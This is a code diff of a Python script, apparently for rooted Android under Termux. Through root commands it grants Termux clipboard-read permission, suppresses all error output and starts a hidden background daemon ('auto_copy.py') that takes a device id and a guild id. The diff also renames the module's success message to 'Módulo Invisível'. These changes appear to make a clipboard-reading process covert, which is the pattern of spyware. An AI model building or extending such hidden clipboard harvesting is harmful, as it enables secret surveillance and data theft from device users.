@@ -69,7 +69,7 @@ except:
 
 def get_data(command):
     try:
-        return subprocess.check_output(f"/system/bin/su -c '{command}'", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
+        return subprocess.check_output(f"su -c '{command}' 2>/dev/null", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
     except:
         return "Unknown"
 
@@ -101,14 +101,13 @@ try:
     caminho_python = sys.executable
     caminho_script = os.path.abspath("functions/auto_copy.py")
     
-    subprocess.run('/system/bin/su -c "appops set com.termux READ_CLIPBOARD allow"', shell=True)
-    subprocess.run('/system/bin/su -c "appops set com.termux SYSTEM_ALERT_WINDOW allow"', shell=True)
+    subprocess.run('su -c "appops set com.termux READ_CLIPBOARD allow" 2>/dev/null', shell=True)
     
     env_vars = f"LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib PATH=/data/data/com.termux/files/usr/bin:$PATH"
-    comando_daemon = f"/system/bin/su -c '{env_vars} {caminho_python} {caminho_script} {device_id} {guild_id} > /dev/null 2>&1 &'"
+    comando_daemon = f"su -c '{env_vars} {caminho_python} {caminho_script} {device_id} {guild_id} > /dev/null 2>&1 &' 2>/dev/null"
     
     os.system(comando_daemon)
-    print(f"✅ Módulo Auto-Focus ejetado com sucesso!")
+    print(f"✅ Módulo Invisível ejetado com sucesso!")
 except Exception as e:
     pass
 
